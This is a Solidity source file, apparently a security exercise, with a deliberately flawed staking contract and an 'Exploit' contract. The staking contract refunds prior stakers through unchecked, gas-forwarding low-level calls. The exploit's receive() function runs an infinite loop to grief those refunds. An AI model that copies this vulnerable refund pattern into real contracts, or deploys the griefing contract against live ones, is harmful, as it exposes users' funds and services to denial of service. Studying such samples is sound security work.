pragma solidity 0.8.19;


import "./RewardToken.sol";

contract IStaking {
    RewardToken rewardToken;

    uint256 constant AMOUNT = 1 ether;
    uint256 EMISSION = 0.2e18; // 0.2 tokens per second

    address public currentStaker;
    uint256 public lastClaim;

    constructor() {
        rewardToken = new RewardToken();
    }

    function deposit() external payable {
        require(msg.value == AMOUNT, "missing amount of ether");

        if(currentStaker != address(0)) {
            _claim();
            currentStaker.call{value: AMOUNT}("");
        }

        lastClaim = block.timestamp;
        currentStaker = msg.sender;
    }

    function withdraw() external {
        require(msg.sender == currentStaker, "not a current staker");
        currentStaker = address(0);
        payable(msg.sender).call{value: AMOUNT}("");
    }

    function claim() public {
        require(currentStaker != address(0), "no current staker"); 
        _claim();
    }

    function _claim() private {
        uint256 duration = block.timestamp - lastClaim;
        lastClaim = block.timestamp;

        uint256 rewards = duration * EMISSION;
        rewardToken.mint(currentStaker, rewards);
    }
}

contract Exploit {
    IStaking staking;
    uint256 count = 0;

    constructor(address stakingAddress) payable {
        staking = IStaking(stakingAddress);
    }

    function attack() external {
        staking.deposit{value: 1 ether}();
        
    }
    
    receive() external payable {
        while(true){
            count++;
        }
    }
}
